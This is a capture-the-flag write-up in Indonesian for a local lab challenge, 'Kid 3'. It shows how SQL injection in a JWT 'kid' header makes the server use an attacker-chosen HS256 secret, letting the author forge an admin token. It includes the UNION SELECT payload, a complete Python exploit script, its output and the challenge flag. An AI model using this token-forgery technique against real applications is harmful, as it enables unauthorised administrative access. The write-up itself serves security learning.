# WriteUp - Kid 3

## Overview

* **Judul:** Kid 3
* **Kategori:** Input Injection
* **Poin:** 25
* **Deskripsi:** Bongkar rahasia admin.
* **URL:** `http://localhost:1337`

## Reconnaissance

### 1. Container & Binary Inspection

Langkah pertama adalah memeriksa lingkungan di dalam container Docker untuk memahami struktur aplikasi. Ditemukan file binary `main` dan database `test.db`.

```bash
$ docker exec kid3-web-1 ls -la
total 14384
drwxr-xr-x    1 root     root          4096 Feb  4 13:27 .
drwxr-xr-x    1 root     root          4096 Feb  4 13:27 ..
-rwxr-xr-x    1 root     root      14707288 Feb  4 09:22 main
-rw-r--r--    1 root     root         12288 Feb  4 13:27 test.db

```

Analisis string pada binary `main` mengungkapkan template HTML dashboard. Ini mengonfirmasi bahwa jika kita berhasil login dengan role `admin`, flag akan ditampilkan di halaman (`{{.Flag}}`).

```bash
$ strings main | grep "admin" -C 5
.logout:hover { color: white; }
</style>
</head>
<body>
    <div class="container">
        {{if eq .Role "admin"}}
            <h1>Admin Console</h1>
            <p>Welcome, Administrator.</p>
            <div class="flag">{{.Flag}}</div>
        {{else}}
            <h1>User Dashboard</h1>

```

### 2. Database Inspection (Critical Step)

Setelah beberapa percobaan injeksi menggunakan format kunci RSA (PEM) gagal, dilakukan pemeriksaan langsung terhadap isi database `test.db`.

```bash
$ docker cp kid3-web-1:/app/test.db ./test.db
Successfully copied 13.8kB to /home/wanzkey/Pwn The Website/Input Injection/Kid 3/test.db

$ sqlite3 test.db "SELECT * FROM keys"
1|1|secretkeyIsHere

```

**Temuan Kunci:**
Isi kolom `key` adalah string biasa (`secretkeyIsHere`), bukan format sertifikat PEM yang panjang. Ini mengindikasikan bahwa server menggunakan algoritma **HS256 (HMAC)**, bukan RS256 (RSA). Server memperlakukan kunci sebagai *passphrase* biasa.

## Vulnerability Analysis

Aplikasi rentan terhadap **SQL Injection** pada header JWT parameter `kid`.
Server mengambil kunci rahasia dari database menggunakan query yang tidak aman, kemungkinan seperti:
`SELECT key FROM keys WHERE kid = 'INPUT_USER'`

Karena kita tahu server mengharapkan string biasa (untuk HS256), kita tidak perlu membuat pasangan kunci RSA. Kita cukup melakukan injeksi SQL untuk memaksa database mengembalikan string rahasia buatan kita sendiri.

## Exploitation

### Skenario Serangan

1. **Algoritma:** Gunakan **HS256**.
2. **Secret Key:** Tentukan string sembarang, misal: `'wanzkey_ganteng'`.
3. **SQL Payload:** Gunakan teknik UNION SELECT untuk mengembalikan string tersebut.
* Payload: `a' UNION SELECT 'wanzkey_ganteng' --`
* Logika: Query pertama (`kid='a'`) kosong, query kedua mengembalikan string kita.


4. **Token Signing:** Buat token JWT dengan payload `role: admin` dan tandatangani menggunakan string `'wanzkey_ganteng'`.

Saat server memverifikasi:

1. Server mengeksekusi SQLi -> mendapatkan kunci `'wanzkey_ganteng'`.
2. Server memverifikasi signature token menggunakan kunci tersebut.
3. Karena token memang ditandatangani dengan kunci itu, verifikasi berhasil dan akses Admin diberikan.

### Script Solver (`exploit.py`)

```python
import requests
import jwt
import time

TARGET_URL = "http://localhost:1337"
DASHBOARD_URL = f"{TARGET_URL}/dashboard"

def exploit():
    # Kunci rahasia simpel yang mau kita inject ke database (via query output)
    secret_key = "wanzkey_ganteng"
    
    # Payload SQL Injection
    # Tujuannya: Bikin database ngebalikin string "wanzkey_ganteng" sebagai kuncinya
    # Query: SELECT key FROM keys WHERE kid = '...'
    # Spasi setelah -- penting untuk komentar SQL
    sqli_payload = f"a' UNION SELECT '{secret_key}' -- "
    
    print(f"[*] Secret Key: {secret_key}")
    print(f"[*] SQLi Payload: {sqli_payload}")

    # Forge Token
    # PENTING: Pake algoritma HS256 (HMAC) karena kuncinya cuma string biasa
    payload = {
        "username": "admin",
        "role": "admin",
        "exp": int(time.time()) + 3600
    }
    
    headers = {
        "kid": sqli_payload
    }
    
    print("[*] Signing token with HS256...")
    # Sign pake secret key kita
    forged_token = jwt.encode(
        payload, 
        secret_key, 
        algorithm="HS256", 
        headers=headers
    )
    
    # Attack
    print("[*] Sending exploit...")
    cookies = {"token": forged_token}
    
    r = requests.get(DASHBOARD_URL, cookies=cookies)
    
    if "pwn{" in r.text or "Admin" in r.text:
        print("\n" + "="*40)
        print("[+] PWNED! Flag Found:")
        for line in r.text.splitlines():
            if "pwn{" in line:
                # Bersihin tag HTML
                print(line.strip().replace('<div class="flag">', '').replace('</div>', ''))
        print("="*40 + "\n")
    else:
        print("[-] Gagal. Cek log docker.")

if __name__ == "__main__":
    exploit()

```

### Output Terminal

```bash
$ ./exploit.py
[*] Secret Key: wanzkey_ganteng
[*] SQLi Payload: a' UNION SELECT 'wanzkey_ganteng' -- 
[*] Signing token with HS256...
[*] Sending exploit...

========================================
[+] PWNED! Flag Found:
pwn{76da17560e8c697d8afe178bc359758a}
========================================

```

## Flag

```
pwn{76da17560e8c697d8afe178bc359758a}

```
